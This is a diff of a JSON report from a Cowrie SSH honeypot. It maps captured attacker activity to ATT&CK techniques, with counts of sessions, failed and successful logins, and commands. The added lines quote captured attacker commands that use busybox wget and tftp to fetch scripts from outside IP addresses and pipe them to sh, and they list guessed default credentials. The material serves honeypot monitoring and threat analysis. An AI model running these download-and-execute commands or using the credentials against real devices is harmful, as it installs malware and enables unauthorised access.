@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-10 00:05:08",
+  "generated": "2026-09-10 01:03:44",
   "totals": {
-    "commands": 69,
-    "login_failed": 30,
-    "login_success": 24,
-    "sessions": 32
+    "commands": 471,
+    "login_failed": 270,
+    "login_success": 156,
+    "sessions": 280
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 30,
+      "count": 270,
       "examples": [
         "root / xc3511",
         "root / 54321",
@@ -21,34 +21,88 @@
         "root / root"
       ],
       "first": "2026-09-10T00:00:10.861058Z",
-      "last": "2026-09-10T00:05:07.071104Z",
-      "unique_ips": 5
+      "last": "2026-09-10T01:02:20.062174Z",
+      "unique_ips": 23
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 24,
+      "count": 156,
       "examples": [
-        "enable\\x00 / linuxshell\\x00"
+        "enable\\x00 / linuxshell\\x00",
+        "enable\\x00 / system\\x00",
+        "enable / system",
+        "admin / admin",
+        "nobody / password"
       ],
       "first": "2026-09-10T00:00:11.554236Z",
-      "last": "2026-09-10T00:05:07.777987Z",
-      "unique_ips": 1
+      "last": "2026-09-10T00:47:34.746545Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 2,
+      "examples": [
+        "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
+        "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh "
+      ],
+      "first": "2026-09-10T00:41:47.834125Z",
+      "last": "2026-09-10T00:43:38.381992Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 2,
+      "examples": [
+        "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh ht",
+        "/bin/busybox wget http://45.150.195.235/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 45.150.195.235 -g -r tftp.sh "
+      ],
+      "first": "2026-09-10T00:41:47.834125Z",
+      "last": "2026-09-10T00:43:38.381992Z",
+      "unique_ips": 2
     }
   ],
   "unmapped": [
     [
-      "system",
-      23
-    ],
-    [
       "shell",
-      23
+      155
     ],
     [
       "sh",
-      23
+      155
+    ],
+    [
+      "system",
+      153
+    ],
+    [
+      "/bin/busybox MIORI",
+      1
+    ],
+    [
+      "/bin/busybox TOKEN",
+      1
+    ],
+    [
+      "enable",
+      1
+    ],
+    [
+      "ping; sh",
+      1
+    ],
+    [
+      "/bin/busybox STC",
+      1
+    ],
+    [
+      "/bin/busybox hostname TOASTER",
+      1
     ]
   ]
 }
